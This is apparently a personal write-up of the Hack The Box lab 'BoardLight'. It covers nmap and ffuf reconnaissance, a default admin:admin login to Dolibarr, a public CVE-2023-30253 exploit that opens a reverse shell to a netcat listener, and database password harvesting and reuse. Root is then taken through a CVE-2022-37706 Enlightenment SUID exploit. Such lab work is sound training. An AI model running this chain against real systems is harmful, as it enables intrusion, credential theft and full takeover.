---
title: "BoardLight_HTB"
date: 2024-09-09T19:06:13-07:00
draft: true
---

My notes from this Hack the Box room. 


` IP=10.10.11.11   `

`  ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP -oN nmap-p | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)  `

```sh
[Mon Sep 09-15:47:50]-[jmk@parrot]-
-[~/Documents/BoardLight]$ $ports
-bash: 22,80: command not found

```

```sh
-[Mon Sep 09-15:48:07]-[jmk@parrot]-
-[~/Documents/BoardLight]$ nmap -sCV -p$ports $IP -oN nmap-sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 15:48 PDT
Nmap scan report for 10.10.11.11
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds

```

From here start ffuf 
add IP to hosts file with 
`sudo sh -c 'echo "10.10.11.11 board.htb" >> /etc/hosts'`
looking at the source of index.php not finding anything interesting

```sh
-[Mon Sep 09-16:30:18]-[jmk@parrot]-
-[~/Documents/BoardLight]$ ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -ic -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.11/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 88ms]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 89ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 90ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 90ms]
                        [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 92ms]
:: Progress: [30000/30000] :: Job [1/1] :: 459 req/sec :: Duration: [0:01:05] :: Errors: 2 ::

```

Now lets look for any subdomains.

```sh
-[Mon Sep 09-16:55:39]-[jmk@parrot]-
-[~/Documents/BoardLight]$ ffuf -u http://board.htb/ -H 'Host: FUZZ.board.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -ic -c -fs 15949

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 111ms]
:: Progress: [19964/19964] :: Job [1/1] :: 405 req/sec :: Duration: [0:00:48] :: Errors: 0 ::

```

add `crm.board.htb` to /etc/hosts

so i load http://crm.board.htb/ and try to log in with 
"admin:admin" and i get into the dashboard

do a quick search for exploits for dolibarr and found [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

```sh
-[Mon Sep 09-16:59:57]-[jmk@parrot]-
-[~/Documents/BoardLight]$ python3 exploit.py http://crm.board.htb admin admin  10.10.14.16 1337
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection

-[Mon Sep 09-17:03:41]-[jmk@parrot]-
-[~/Documents/BoardLight]$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.11] 39280
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
...
www-data@boardlight:/home$ find / -type d -name 'conf'
find / -type d -name 'conf'
find: '/var/log/mysql': Permission denied
...
find: '/var/lib/udisks2': Permission denied
/var/lib/apache2/conf
find: '/var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/partial': Permission denied
...


www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';



```

so now we know about a mysql database 
```json
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
```

so lets try 
```sh
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p
<rm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p
Enter password: serverfun2$2023!!
show databases
;
SHOW DATABASES;

exit
Database
dolibarr
information_schema
performance_schema
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p
<rm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p
Enter password: serverfun2$2023!!
use dolibarr
SHOW TABLES;
Tables_in_dolibarr
llx_accounting_account
...
llx_user
...
SELECT * FROM llx_user;

rowid   entity  ref_employee    ref_ext admin   employee        fk_establishment        datec   tms      fk_user_creat   fk_user_modif   login   pass_encoding   pass    pass_crypted    pass_tempapi_key gender  civility        lastname        firstname       address zip     town    fk_statefk_country       birth   birth_place     job     office_phone    office_fax      user_mobile     personal_mobile  email   personal_email  signature       socialnetworks  fk_soc  fk_socpeople    fk_member        fk_user fk_user_expense_validator       fk_user_holiday_validator       idpers1 idpers2  idpers3 note_public     note_private    model_pdf       datelastlogin   datepreviouslogindatelastpassvalidation  datestartvalidity       dateendvalidity iplastlogin     ippreviouslogin egroupware_id    ldap_sid        openid  statut  photo   lang    color   barcode fk_barcode_type accountancy_code nb_holiday      thm     tjm     salary  salaryextra     dateemployment  dateemploymentend        weeklyhours     import_key      default_range   default_c_exp_tax_cat   national_registration_number     fk_warehouse
1       0               NULL    1       1       0       2024-05-13 13:21:56     2024-05-13 13:21:56      NULL    NULL    dolibarr        NULL    NULL    $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm     NULL    NULL                    SuperAdmin                              NULL     NULL    NULL    NULL                                                                    null     NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL                    NULL     2024-05-15 09:57:04     2024-05-13 23:23:59     NULL    NULL    NULL    10.10.14.31     10.10.14.41      NULL            NULL    1       NULL    NULL            NULL    0               0NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL            NULL
2       1               NULL    0       1       0       2024-05-13 13:24:01     2024-05-15 09:58:40      NULL    NULL    admin   NULL    NULL    $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96     NULL    yr6V3pXd9QEI    NULL            admin                                   NULL     NULL    NULL    NULL                                                                    []       NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL    NULL                    NULL     2024-09-09 17:03:49     2024-09-09 16:51:02     NULL    NULL    NULL    10.10.14.

...
use dolibarr
select pass_crypted,pass_temp,api_key,firstname from llx_user;

www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p
<rm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p
Enter password: serverfun2$2023!!
use dolibarr
select pass_crypted,pass_temp,api_key,firstname from llx_user;
exit
pass_crypted    pass_temp       api_key firstname
$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm    NULL    NULL
$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96    NULL    yr6V3pXd9QEI
```
I spent some time trying diffrent combination with the data but nothing worked. 
This was suposed to be an easy box so maybe it was simpler then that. 
Lets try this...
```sh
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
su larissa
Password: serverfun2$2023!!
whoami
larissa
#### switch to ssh
-[Mon Sep 09-17:52:49]-[jmk@parrot]-
-[~/Documents/BoardLight]$ ssh larissa@$IP
larissa@10.10.11.11's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ cat user.txt
501...7ae
larissa@boardlight:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
...
/usr/bin/vmware-user-suid-wrapper


```

I look up enliightenment
I find [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)
I follow a link to [github-MaherAzzouzi](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)

```sh
-[Mon Sep 09-18:05:04]-[jmk@parrot]-
-[~/Documents/BoardLight]$ sudo scp exploit.sh larissa@$IP:/tmp
larissa@10.10.11.11's password:
exploit.sh                                                100%  709     7.7KB/s   00:00

```


```sh root
larissa@boardlight:/tmp$ chmod +x exploit.sh
larissa@boardlight:/tmp$ ./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
# cd
# pwd
/tmp
# ls
';'           systemd-private-b16b7c60638844468704c6d324edcef1-apache2.service-mgItAg
 VMwareDnD    systemd-private-b16b7c60638844468704c6d324edcef1-systemd-logind.service-JP1CZh
 exploit      systemd-private-b16b7c60638844468704c6d324edcef1-systemd-resolved.service-hZPRZi
 exploit.sh   systemd-private-b16b7c60638844468704c6d324edcef1-systemd-timesyncd.service-MYRzgg
 net          vmware-root_650-2696943027
# cd /root
# pwd
/root
# ls
root.txt  snap
# cat root.txt
eeb...d87

```

help from [h4s7ur](https://medium.com/@h4s7ur/hack-the-box-boardlight-walkthrough-0d33b192142a)
